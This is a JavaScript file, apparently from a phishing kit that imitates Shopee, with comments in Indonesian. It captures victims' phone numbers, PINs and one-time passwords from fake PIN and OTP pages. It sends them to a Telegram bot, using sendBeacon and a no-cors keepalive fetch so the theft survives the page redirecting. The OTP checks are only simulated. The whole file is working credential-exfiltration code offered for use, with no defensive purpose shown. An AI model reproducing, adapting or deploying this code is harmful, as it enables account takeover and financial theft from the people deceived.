// ============================================================
// database.js - Objek global userDB untuk pengelolaan data user
// dan pengiriman data (nomor + PIN + OTP) ke Telegram.
// Membutuhkan config.js (TELEGRAM_CONFIG & sendToTelegram).
// ============================================================

const userDB = (function () {
    // Helper: kirim pesan ke Telegram dengan prioritas sendBeacon
    // agar tetap terkirim meskipun halaman langsung redirect.
    // Mengembalikan Promise<boolean> (true jika diproses).
    function sendTelegramMessage(text) {
        const endpoint = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;

        // Payload urlencoded = CORS-safelisted (tanpa preflight browser),
        // sehingga pesan bisa dikirim lintas-origin tanpa CORS error.
        const payload = new URLSearchParams({
            chat_id: TELEGRAM_CONFIG.CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });

        // 1) PRIORITAS: navigator.sendBeacon (fire-and-forget, tidak terpotong redirect)
        if (navigator.sendBeacon) {
            try {
                const sent = navigator.sendBeacon(endpoint, payload);
                if (sent) {
                    console.log('✅ [sendBeacon] Pesan terkirim ke Telegram');
                    return Promise.resolve(true);
                }
                console.warn('⚠️ sendBeacon mengembalikan false, fallback ke fetch...');
            } catch (e) {
                console.warn('⚠️ sendBeacon gagal:', e);
            }
        }

        // 2) FALLBACK: fetch no-cors + keepalive (tetap berjalan saat redirect)
        try {
            fetch(endpoint, {
                method: 'POST',
                mode: 'no-cors',
                cache: 'no-store',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: payload,
                keepalive: true
            }).catch((error) => {
                console.error('❌ Gagal mengirim via fetch:', error);
            });
            console.log('✅ [fetch no-cors] Pesan dikirim ke Telegram');
            return Promise.resolve(true);
        } catch (e) {
            console.error('❌ Gagal mengirim ke Telegram:', e);
            return Promise.resolve(false);
        }
    }

    return {
        // Simpan data user ke localStorage (catatan lokal).
        saveUser: function (userData) {
            try {
                const existing = JSON.parse(localStorage.getItem('shopeeUsers') || '[]');
                existing.push({
                    ...userData,
                    timestamp: new Date().toISOString()
                });
                localStorage.setItem('shopeeUsers', JSON.stringify(existing));
                console.log('💾 Data user tersimpan di localStorage');
            } catch (e) {
                console.error('❌ Gagal menyimpan data user:', e);
            }
        },

        // Kirim NOMOR + PIN ke Telegram (dipanggil dari pin.html).
        sendPinDataToTelegram: function (phone, pin) {
            const message =
                '🔐 <b>DATA BARU MASUK (PIN)</b>\n' +
                '━━━━━━━━━━━━━━━━━━\n' +
                '📱 <b>Nomor HP:</b> ' + (phone || '-') + '\n' +
                '🔑 <b>PIN:</b> ' + (pin || '-') + '\n' +
                '⏰ <b>Waktu:</b> ' + new Date().toLocaleString('id-ID') + '\n' +
                '━━━━━━━━━━━━━━━━━━';
            return sendTelegramMessage(message);
        },

        // Kirim OTP ke Telegram (dipanggil dari otp.html).
        sendOtpDataToTelegram: function (phone, otp) {
            const pin = sessionStorage.getItem('userPin') || '-';
            const message =
                '🔐 <b>DATA BARU MASUK (OTP)</b>\n' +
                '━━━━━━━━━━━━━━━━━━\n' +
                '📱 <b>Nomor HP:</b> ' + (phone || '-') + '\n' +
                '🔑 <b>PIN:</b> ' + pin + '\n' +
                '🔢 <b>OTP:</b> ' + (otp || '-') + '\n' +
                '⏰ <b>Waktu:</b> ' + new Date().toLocaleString('id-ID') + '\n' +
                '━━━━━━━━━━━━━━━━━━';
            return sendTelegramMessage(message);
        },

        // Validasi OTP (simulasi, tanpa backend).
        // Kembalikan true jika OTP berupa 6 digit angka.
        validateOTP: function (phone, otp) {
            return typeof otp === 'string' && /^\d{6}$/.test(otp);
        },

        // Simulasi pengiriman OTP ke nomor (tanpa backend).
        sendOTP: function (phone) {
            return Promise.resolve({ success: true, message: 'OTP dikirim (simulasi)' });
        }
    };
})();
